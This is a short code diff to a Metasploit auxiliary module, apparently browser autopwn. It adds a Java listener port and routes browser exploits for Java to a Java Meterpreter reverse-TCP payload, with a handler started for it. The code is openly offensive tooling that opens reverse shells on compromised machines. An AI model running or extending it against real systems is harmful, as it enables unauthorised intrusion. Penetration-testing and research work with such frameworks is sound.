@@ -236,10 +236,11 @@ class Metasploit3 < Msf::Auxiliary
 		# self-identifying payloads so we'd only need 1 LPORT for multiple
 		# stagers.
 		#
-		@win_lport = datastore['LPORT_WIN32'] || 3333
-		@lin_lport = datastore['LPORT_LINUX'] || 4444
-		@osx_lport = datastore['LPORT_MACOS'] || 5555
-		@gen_lport = datastore['LPORT_GENERIC'] || 6666
+		@win_lport  = datastore['LPORT_WIN32'] || 3333
+		@lin_lport  = datastore['LPORT_LINUX'] || 4444
+		@osx_lport  = datastore['LPORT_MACOS'] || 5555
+		@gen_lport  = datastore['LPORT_GENERIC'] || 6666
+		@java_lport = datastore['LPORT_JAVA'] || 7777
 
 		minrank = framework.datastore['MinimumRank'] || 'manual'
 		if not RankingName.values.include?(minrank)
@@ -273,6 +274,12 @@ class Metasploit3 < Msf::Auxiliary
 		#when %r{osx}
 			# Some day...
 			#payload='osx/meterpreter/reverse_tcp'
+		# We need to check that it's /java_ instead of just java since it would
+		# clash with things like mozilla_navigatorjava.  Better would be to
+		# check the actual platform of the module here but i'm lazy.
+		when %r{/java_}
+			payload='java/meterpreter/reverse_tcp'
+			lport = @java_lport
 		else
 			lport = @gen_lport
 			payload='generic/shell_reverse_tcp'
@@ -399,7 +406,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 		# start handlers for each type of payload
-		[@win_lport, @lin_lport, @osx_lport, @gen_lport].each do |lport|
+		[@win_lport, @lin_lport, @osx_lport, @gen_lport, @java_lport].each do |lport|
 			if (lport and @payloads[lport])
 				print_status("Starting handler for #{@payloads[lport]} on port #{lport}")
 				multihandler = framework.modules.create("exploit/multi/handler")
